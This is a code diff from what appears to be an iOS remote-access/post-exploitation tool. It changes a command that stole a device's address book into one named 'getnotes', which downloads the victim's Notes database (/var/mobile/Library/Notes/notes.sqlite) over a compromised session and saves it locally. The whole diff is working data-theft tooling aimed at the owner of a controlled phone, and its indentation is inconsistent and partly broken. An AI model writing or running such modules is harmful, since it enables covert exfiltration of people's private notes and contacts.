@@ -24,32 +24,34 @@ import core.helper as h
 
 class command:
 	def __init__(self):
-		self.name = "getcontacts"
-		self.description = "Download addressbook."
-		self.usage = "Usage: getcontacts <local_path>"
+		self.name = "getnotes"
+		self.description = "Download notes."
+		self.usage = "Usage: getnotes <local_path>"
 
 	def run(self,session,cmd_data):
 		if len(cmd_data['args'].split()) < 1:
             		print self.usage
             		return
 		
+		w = os.environ['OLDPWD']
+                os.chdir(w)
 		dest = cmd_data['args'][0]
                 if os.path.isdir(dest):
                     if os.path.exists(dest):
-			 h.info_general("Downloading addressbook...")
-			 data = session.download_file('/var/mobile/Library/AddressBook/AddressBook.sqlitedb')
+			 h.info_general("Downloading notes...")
+			 data = session.download_file('/var/mobile/Library/Notes/notes.sqlite')
 			 if data:
-			     f = open(os.path.join(dest,'AddressBook.sqlitedb'),'w')
+			     f = open(os.path.join(dest,'notes.sqlite'),'w')
 			     f.write(data)
 			     f.close()
                          if dest[-1:] == "/":
-                             h.info_general("Saving to "+dest+"AddressBook.sqlitedb...")
+                             h.info_general("Saving to "+dest+"notes.sqlite...")
                              time.sleep(1)
-                             h.info_success("Saved to "+dest+"AddressBook.sqlitedb!")
+                             h.info_success("Saved to "+dest+"notes.sqlite!")
                          else:
-                             h.info_general("Saving to "+dest+"/AddressBook.sqlitedb...")
+                             h.info_general("Saving to "+dest+"/notes.sqlite...")
                              time.sleep(1)
-                             h.info_success("Saved to "+dest+"/AddressBook.sqlitedb!")
+                             h.info_success("Saved to "+dest+"/notes.sqlite!")
                     else:
                         h.info_error("Local directory: "+dest+": does not exist!")
                 else:
@@ -58,8 +60,8 @@ class command:
 			if os.path.isdir(rp):
 			    pr = os.path.split(dest)[0]
                             rp = os.path.split(dest)[1]
-                            h.info_general("Downloading addressbook...")
-			    data = session.download_file('/var/mobile/Library/AddressBook/AddressBook.sqlitedb')
+                            h.info_general("Downloading notes...")
+			    data = session.download_file('/var/mobile/Library/Notes/notes.sqlite')
 			    if data:
 			        f = open(os.path.join(pr,rp),'w')
 			        f.write(data)
@@ -71,3 +73,5 @@ class command:
                             h.info_error("Error: "+rp+": not a directory!")
                     else:
                         h.info_error("Local directory: "+rp+": does not exist!")
+		g = os.environ['HOME']
+                os.chdir(g + "/mouse")
